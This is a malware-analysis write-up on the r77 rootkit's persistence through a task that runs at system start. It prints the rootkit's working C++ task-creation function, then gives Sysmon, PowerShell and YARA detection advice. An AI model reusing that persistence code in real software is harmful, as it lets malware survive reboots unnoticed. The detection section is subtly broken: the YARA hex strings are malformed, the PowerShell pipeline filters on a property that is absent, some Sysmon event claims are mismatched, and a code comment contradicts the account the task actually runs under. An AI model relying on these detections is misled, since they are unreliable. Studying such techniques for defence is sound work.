# r77 Rootkit - Scheduled Task System Start Trigger Persistence

**Repository:** MalwareSourceCode-main  
**File Path:** `Win32/Rootkits/Win32.Rootkit.r77/Win32.Rootkit.r77/src/r77api.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1053.005 - Scheduled Task/Job: Scheduled Task

---

## Overview

The r77 rootkit, an open-source tool often used for red teaming and by advanced threat actors, establishes persistence by creating a scheduled task set to execute at system startup. This method ensures the rootkit's code runs with high privileges early in the boot process, before a user logs in and often before security products have fully initialized. Like Carberp, r77 uses the legacy `ITaskScheduler` COM interface to create the task. However, it specifically uses the `TASK_EVENT_TRIGGER_AT_SYSTEMSTART` trigger type, prioritizing system-level persistence and resilience over the user-session-focused approach seen in other malware.

---

## Code Snippet: Creating a System Start Task

```cpp
BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCWSTR arguments)
{
	BOOL result = FALSE;

	if (SUCCEEDED(CoInitialize(NULL)))
	{
		ITaskScheduler *taskScheduler = NULL;
		// STEP 1: Instantiate the legacy Task Scheduler COM object
		if (SUCCEEDED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&taskScheduler)))
		{
			ITask *task = NULL;
			// STEP 2: Create a new task object
			if (SUCCEEDED(taskScheduler->NewWorkItem(name, CLSID_CTask, IID_ITask, (IUnknown**)&task)))
			{
				// Configure application path, arguments, and run as the current user
				if (SUCCEEDED(task->SetWorkingDirectory(directory)) &&
					SUCCEEDED(task->SetApplicationName(fileName)) &&
					SUCCEEDED(task->SetParameters(arguments)) &&
					SUCCEEDED(task->SetAccountInformation(L"", NULL)))
				{
					WORD triggerId;
					ITaskTrigger *trigger = NULL;
					// STEP 3: Create a trigger for the task
					if (SUCCEEDED(task->CreateTrigger(&triggerId, &trigger)))
					{
						TASK_TRIGGER triggerDetails;
						ZeroMemory(&triggerDetails, sizeof(TASK_TRIGGER));
						triggerDetails.cbTriggerSize = sizeof(TASK_TRIGGER);
						// STEP 4: Define the trigger to fire at system startup
						triggerDetails.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;
						triggerDetails.wBeginDay = 1;
						triggerDetails.wBeginMonth = 1;
						triggerDetails.wBeginYear = 2000;

						if (SUCCEEDED(trigger->SetTrigger(&triggerDetails)))
						{
							IPersistFile *persistFile = NULL;
							// STEP 5: Save the task to disk
							if (SUCCEEDED(task->QueryInterface(IID_IPersistFile, (void **)&persistFile)))
							{
								if (SUCCEEDED(persistFile->Save(NULL, TRUE)))
								{
									result = TRUE;
								}
								persistFile->Release();
							}
						}
						trigger->Release();
					}
				}
				task->Release();
			}
			taskScheduler->Release();
		}
		CoUninitialize();
	}
	return result;
}
```

**What it does:**  
The `CreateScheduledTask` function initializes COM and gets a pointer to the `ITaskScheduler` interface. It creates a new task (`NewWorkItem`) and configures its executable path, arguments, and working directory. The key part of the technique is the creation of a `TASK_TRIGGER` structure where the `TriggerType` is explicitly set to `TASK_EVENT_TRIGGER_AT_SYSTEMSTART`. This instructs the Task Scheduler to execute the task as soon as the system boots, without waiting for a user to log on. Finally, it uses the `IPersistFile` interface to save the newly created task to disk, making the persistence effective across reboots.

**Why it's T1053.005:**  
This is a clear example of using a scheduled task for persistence. The malware leverages a native Windows feature to ensure its execution. By choosing the `AT_SYSTEMSTART` trigger, the author ensures the code runs in a high-privilege system context and gains a "first-mover advantage" by executing early in the boot process. This allows the rootkit to establish its hooks and defensive impairments before most security software is active, making it a highly effective technique for resilient, system-level persistence.

---

## Detection & Evasion

### Sysmon Telemetry

- **Event ID 1: ProcessCreate**: Similar to the logon trigger, monitor for non-standard processes (i.e., not `schtasks.exe`) that load `mstask.dll` and create files in `C:\Windows\System32\Tasks`.
- **Event ID 12 & 13 & 14: RegistryEvent (Key and Value Create/Set)**: Monitor for the creation of keys under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. A new task will create a corresponding key with its name. The task's XML definition can be found under the `Id` value of a subkey, which can be inspected for a `<BootTrigger>` or `<LogonTrigger>` element.
- **PowerShell**: The `Get-ScheduledTask` cmdlet can be used to enumerate all tasks, including hidden ones, and their triggers. Look for tasks with a `MSFT_TaskBootTrigger` or `MSFT_TaskLogonTrigger`.
  ```powershell
  Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object { $_.Triggers.TriggerType -eq 'Boot' }
  ```

### YARA Rule

```yara
rule T1053_Persistence_r77_SystemStartTask
{
    meta:
        author = "Vengful"
        description = "Detects strings related to the r77 rootkit's use of the legacy ITaskScheduler COM interface for system start persistence."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1053.005"

    strings:
        // COM Class and Interface IDs for ITaskScheduler
        $clsid = { A4 1151 83 - E4 1B - 11 D0 - 96 C9 - 00 00 F8 75 B5 87 } // CLSID_CTaskScheduler
        $iid_task = { A6 1151 83 - E4 1B - 11 D0 - 96 C9 - 00 00 F8 75 B5 87 } // IID_ITask
        $iid_persist = { 0B 12 2B 00 - 00 00 - 00 00 - C0 00 - 00 00 00 00 00 46 } // IID_IPersistFile

        // Key function name
        $func1 = "CreateScheduledTask" wide
        
        // Specific trigger value
        $s1 = "TASK_EVENT_TRIGGER_AT_SYSTEMSTART" ascii

    condition:
        uint16(0) == 0x5A4D and // MZ header
        $func1 and $s1 and all of ($clsid, $iid_task, $iid_persist)
}
```